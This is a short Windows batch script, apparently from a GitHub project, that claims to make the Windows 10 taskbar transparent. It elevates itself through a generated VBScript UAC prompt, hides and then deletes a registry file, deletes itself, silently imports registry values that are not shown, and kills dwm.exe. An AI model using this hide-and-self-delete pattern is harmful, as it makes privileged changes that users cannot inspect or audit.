@echo off
echo Win10 Transparent Taskbar
echo https://github.com/Saylangoz1/Win10-Transparent-Taskbar
attrib +s +h i.reg > NUL
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/c cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
start /min del %0
regedit /s i.reg
start /min del i.reg
taskkill /f /im dwm.exe
